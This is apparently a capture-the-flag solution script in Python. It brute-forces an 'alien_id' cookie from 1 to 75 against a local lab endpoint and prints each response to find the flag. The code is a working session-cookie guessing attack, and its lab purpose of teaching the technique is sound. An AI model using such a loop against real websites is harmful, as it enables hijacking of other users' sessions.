#
# Write a script that can guess cookie values
# and send them to the url http://127.0.0.1:8082/cookiestore
# Read the response from the logged in cookie value to get the flag.
# The cookie name the aliens are using is alien_id
# we believe the id is a number between 1 and 75
#
# Note: The script can timeout. If this occurs try narrowing
# down your search
#

# NTS: Don't overthink :skull:

from urllib import request

for x in range(1, 76):
  print(request.urlopen(request.Request("http://127.0.0.1:8082/cookiestore", headers = { "Cookie" : "alien_id = %s" % str(x) })).read().decode("utf-8"))
